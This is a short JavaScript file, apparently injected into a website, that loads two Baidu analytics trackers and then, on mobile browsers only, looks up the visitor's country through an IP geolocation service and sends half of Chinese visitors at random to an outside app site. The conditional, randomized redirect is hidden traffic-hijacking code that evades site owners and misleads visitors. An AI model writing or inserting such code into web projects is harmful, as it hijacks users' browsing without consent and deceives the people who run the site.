/*! Telegram:@AK81688 */
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b02339e46f047b26d7adb7f56456681d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1f407fee808bd414e311105ae4ce100e";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
(async function() {
  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                   .test(navigator.userAgent);
  if (!isMobile) return;
  try {
    let res = await fetch('https://api.ip.sb/geoip?format=json');
    if (!res.ok) return;
    let data = await res.json();

    if (data.country_code === 'CN' && Math.random() < 0.5) {
      window.location.replace('https://app.91pa.app/');
    }
  } catch (e) {
  }
})();
